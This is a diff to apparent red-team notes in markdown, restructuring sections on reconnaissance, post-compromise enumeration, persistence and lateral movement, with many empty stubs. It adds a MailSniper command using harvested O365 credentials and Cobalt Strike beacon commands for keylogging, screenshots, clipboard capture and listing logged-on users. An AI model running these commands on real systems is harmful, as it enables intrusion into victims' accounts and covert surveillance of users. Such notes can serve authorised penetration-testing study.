@@ -8,9 +8,11 @@
 
 
 
+### Command & Control (C2)
 
 
-## External Reconnaissance / Enumeration
+
+## External Reconnaissance & Enumeration
 
 ### Google Dorking
 
@@ -168,39 +170,156 @@ If we decide to do this attack, it's best to take our time with this (depending 
 
 
 
-## Post Compromise / Enumeration & Reconnaisance
+## Post Compromise - Enumeration & Reconnaissance
 
 ### Harvested O365 Credentials
 
 #### Download Global Address List
 
-If we have valid credentials to an O365 account, we may be able to download the global address list of employees connected to O365.
+Download global email address list with MailSniper.
 
-```powershell
-PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.rotta.dev 
--UserName rotta.dev\cassy -Password FoxyLady123! -OutFile .\Desktop\gal.txt
-```
+* ```powershell
+  PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.rotta.dev 
+  -UserName rotta.dev\cassy -Password FoxyLady123! -OutFile .\Desktop\gal.txt
+  ```
+
+### Host Recon - Cobalt Strike
+
+#### List Processes
+
+* ```powershell
+  beacon> ps
+  ```
+
+#### List Tasks
+
+* ```powershell
+  beacon> ps
+  ```
+
+#### Seatbelt
+
+* ```powershell
+  beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt.exe -group=system
+  ```
+
+#### Keylogger
+
+* ```powershell
+  beacon> keylogger
+  [+] received keystrokes from *Untitled - Notepad by nancy
+
+  beacon> jobs
+  [*] Jobs
+
+   JID  PID   Description
+   ---  ---   -----------
+   1    0     keystroke logger
+
+  beacon> jobkill 1
+  ```
+
+#### Screenshots
+
+* ```
+  printscreen               Take a single screenshot via PrintScr method
+  screenshot                Take a single screenshot
+  screenwatch               Take periodic screenshots of desktop
+  ```
+
+#### Clipboard
+
+* ```
+  beacon> clipboard
+  ```
+
+#### User Sessions
+
+* ```powershell
+  beacon> net logons
+
+  Logged on users at \\localhost:
+
+  DEV\nancy
+  DEV\cassy
+  DEV\PWNBOX$
+  ```
+
+
+
+### Windows Registries
+
+
+
+### Tasks
+
+
+
+
+
+### Processes
+
+
+
+
+
+### COM Hijacking
+
+
+
+
+
+
+
+
+
+##
+
+## Post Compromise - Persistence
+
+### Persistence - SharPersist & Cobalt Strike
+
+#### Task Scheduler
+
+
+
+#### AutoRun Registry
+
+
+
+##
+
+## Post Compromise - Lateral Movement
 
 ### Internal Phishing
 
-
+TODO Add Teams, Slack, OneDrive, and others.
 
 
 
 ### Initial Access Payloads
 
-Once we have access, our immediate next step is to gain persistence. The most optimal, but hardest, is to establish our Command & Control. To do so carries multiple barriers we have to overcome: User privileges, security solutions, firewall rules, etc. All of which means nothing unless our C\&C infrastructure is properly setup to avoid being flagged as suspicious (which will likely happen), or decrypted by Firewall / IDPS / DLP / EDR, amongst others. See above for more.
-
-There are two ways we can deliver this payload after compromising a O365 account:
-
-* Send the payload in a phishing email.
-* Send a URL to the victim that contains a download to the payload. (MOTW)
-
-
-
 ### VBA Macros
 
 When&#x20;
+
+
+
+
+
+### Remote template Injection
+
+
+
+
+
+### HTML Smuggling
+
+
+
+
+
+
 
 &#x20;
 
